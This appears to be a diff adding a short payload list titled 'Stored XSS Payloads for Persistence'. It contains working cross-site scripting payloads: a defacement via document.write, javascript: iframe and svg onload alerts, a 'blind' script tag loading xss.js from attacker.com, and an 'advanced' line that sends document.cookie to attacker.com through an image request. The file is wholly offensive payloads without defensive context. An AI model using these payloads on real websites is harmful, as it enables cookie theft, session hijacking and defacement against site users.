@@ -1,0 +1,6 @@
+# Stored XSS Payloads for Persistence
+<script>document.write('<h1>Pwned by XSS</h1>')</script>
+<iframe src="javascript:alert('Stored')"></iframe>
+<svg onload=alert(1)>
+# Blind: <script src="//attacker.com/xss.js"></script>
+# Advanced: <script>new Image().src="http://attacker.com?data="+encodeURI(document.cookie)</script>
